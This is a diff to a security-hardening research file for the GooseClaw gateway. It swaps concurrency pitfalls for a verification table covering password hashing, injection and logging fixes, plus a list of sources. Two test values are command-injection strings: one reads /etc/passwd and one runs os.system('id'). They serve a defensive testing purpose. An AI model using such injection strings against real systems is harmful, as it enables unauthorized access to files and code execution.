-| Multi-bot support | Pitfall 2 (global restart), Pitfall 3 (session pollution) | Scope all session state by bot_id, make `/clear` per-user not global |
-| Per-channel provider routing | Pitfall 3 (model cache lost on restart), Pitfall 9 (config schema) | Persist model cache, design hierarchical config from day one |
-| Command routing (/help, /stop, /clear) | Pitfall 6 (race conditions) | Add restart generation counter, serialize restart requests |
-| Notification bus multi-bot | Pitfall 7 (wrong bot receives notification) | Add scope/bot_id to handler registration and job targeting |
-| Memory writer | Pitfall 10 (cross-bot memory bleed) | Scope learnings directory by bot_id |
-| Concurrency testing | Pitfall 13 (test gap) | Add threading tests BEFORE refactoring, not after |
-| Session migration | Pitfall 14 (lost sessions on upgrade) | Write migration function, keep backup files |
-| Lock refactoring | Pitfall 1 (re-entrancy), Pitfall 5 (ordering) | Switch to RLock, define lock hierarchy, add timeouts |
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Password hash migration (Pitfall 1) | Security fixes, first item | Test: create SHA-256 hash, verify with new code, confirm transparent rehash to PBKDF2 |
+| stdlib vs argon2/bcrypt (Pitfall 2) | Security fixes, arch decision | Verify: no argon2/bcrypt imports in gateway.py, only hashlib.pbkdf2_hmac |
+| Shell injection in jobs (Pitfall 3) | Security fixes | Test: create job with `; cat /etc/passwd` command, verify rejection or safe execution |
+| Inline Python injection (Pitfall 4) | Security fixes | Test: `secret set "test.key" "'; os.system('id'); '"` doesn't execute code |
+| Recovery secret in logs (Pitfall 5) | Security fixes, first commit | Verify: `docker logs` from first boot doesn't show full secret |
+| Fragile test mocks (Pitfall 6) | Testing phase, establish patterns first | Review: new tests use HTTP-level testing, not internal function patching |
+| print() to structured logging | Hardening phase | `grep -c "^[^#]*print(" gateway.py` returns 0 or known-intentional count |
+| Unpinned dependencies | Hardening phase | `grep -c "[><=]" requirements.txt` returns 0 (all use ==) |
+| Request body size limits | Hardening phase | Test: POST 100MB to /api/setup, verify rejection before full body read |
+| Security headers vs setup.html | Hardening phase | Manual: load setup.html with all headers, verify no console errors, inline JS works |
+| Graceful shutdown | Hardening phase | Test: SIGTERM during active relay, verify clean shutdown and notification to user |
 
 ## Sources
 
-- GooseClaw `gateway.py` source code analysis (primary)
-- Git history: commits `071fb00` (deadlock fix), `caab970` (/clear hang), `a369dfc` (race conditions), `d45d9fe` (/clear restart)
-- [Python threading.Lock documentation](https://docs.python.org/3/library/threading.html)
-- [Real Python: Avoiding Deadlocks with RLock](https://realpython.com/lessons/avoiding-deadlocks-rlock/)
-- [Super Fast Python: How to Identify a Deadlock](https://superfastpython.com/thread-deadlock-in-python/)
-- [Goose Discussion #4389: per-session agents](https://github.com/block/goose/discussions/4389)
-- [Goose GitHub: session isolation architecture](https://github.com/block/goose)
-- [Python Concurrency Best Practices](https://realpython.com/ref/best-practices/concurrency/)
-- [Multi-Tenancy session isolation patterns](https://www.viget.com/articles/multi-tenancy-in-django/)
-- [AI Gateway architecture patterns 2026](https://www.truefoundry.com/blog/a-definitive-guide-to-ai-gateways-in-2026-competitive-landscape-comparison)
+- [OWASP Password Hashing Guide 2025](https://guptadeepak.com/the-complete-guide-to-password-hashing-argon2-vs-bcrypt-vs-scrypt-vs-pbkdf2-2026/) - PBKDF2 vs argon2 vs bcrypt comparison, iteration recommendations
+- [Python hashlib documentation](https://docs.python.org/3/library/hashlib.html) - pbkdf2_hmac and scrypt stdlib availability confirmed
+- [Simon Willison: Password hashing with PBKDF2](https://til.simonwillison.net/python/password-hashing-with-pbkdf2) - practical PBKDF2 implementation
+- [OpenStack: Python Pipes to Avoid Shells](https://security.openstack.org/guidelines/dg_avoid-shell-true.html) - shell=True avoidance patterns
+- [Bandit B602](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html) - subprocess shell=True security rule
+- [Snyk: Command Injection in Python](https://snyk.io/blog/command-injection-python-prevention-examples/) - injection prevention patterns
+- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html) - container hardening
+- [Why Retrofitting Tests Is Hard](https://modelephant.medium.com/software-engineering-why-retrofitting-tests-is-hard-9ea4e7af3e48) - testing retrofit challenges
+- [New Relic: Structured Logging in Python](https://newrelic.com/blog/log/python-structured-logging) - JSON logging patterns and migration
+- Codebase analysis: gateway.py (406KB, 9700+ lines), entrypoint.sh (700+ lines), secret.sh, job.sh, remind.sh, notify.sh, test_gateway.py (8640 lines, 624 tests)
+
+---
+*Pitfalls research for: GooseClaw v4.0 Production Hardening*
+*Researched: 2026-03-16*
